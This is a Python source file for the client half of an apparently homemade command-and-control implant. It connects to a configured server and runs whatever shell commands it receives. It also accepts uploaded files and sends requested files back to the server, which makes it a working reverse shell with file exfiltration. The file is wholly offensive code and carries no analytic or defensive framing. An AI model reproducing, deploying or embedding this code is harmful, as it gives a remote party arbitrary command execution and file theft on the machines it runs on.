#!/usr/bin/env python3
import socket
import os
import subprocess
import pathlib
import tqdm
import time
from C2utils import snd_msg, get_msg, snd_file, get_file

#############################
## ========  Config  ========
PORT = 5050 ## CONFIGURE THIS
SERVER = socket.gethostbyname(socket.gethostname()) ## CONFIGURE THIS
## --------------------------
FORMAT = 'utf-8'
ADDR = (SERVER, PORT)
DISCONNECT_MESSAGE = "exit"
#############################

## ========= Setup ==========
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

## ========= Functions =====
def execute_command(conn, cmd_str):
    try:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print("Command failed " + cmd_str)
    stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
    snd_msg(conn, stdoutput)

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        # Retrieve Message from server
        msg = get_msg(client)

        if msg == DISCONNECT_MESSAGE:
            connected = False

        ## Cd
        elif msg[:2] == "cd":
            try:
                abs_path = os.path.abspath(os.path.join(os.getcwd(), msg[3:]))
                os.chdir(abs_path)
                snd_msg(conn, os.getcwd())
            except:
                snd_msg(conn, "Failed to change directory.")

        ## Put
        elif msg[:3] == "put":
            get_file(client)
        
        ## Grab
        elif msg[:4] == "grab":
            filename = get_msg(client)
            try:
                filesize = os.path.getsize(filename)
            except:
                snd_msg(client, f"Couldn't open {filename}.")
                continue
            
            snd_msg(client, f"SUCCESS")
            snd_file(client, filename) ## Sends the file to the server

        ## Close
        elif msg[:5] == "close":
            client.close()
            print("Killed by server.")
            connected = False

        else:
            execute_command(client, msg)
    conn.close()

## ======== Client-Start ========
listen_to_server(client)
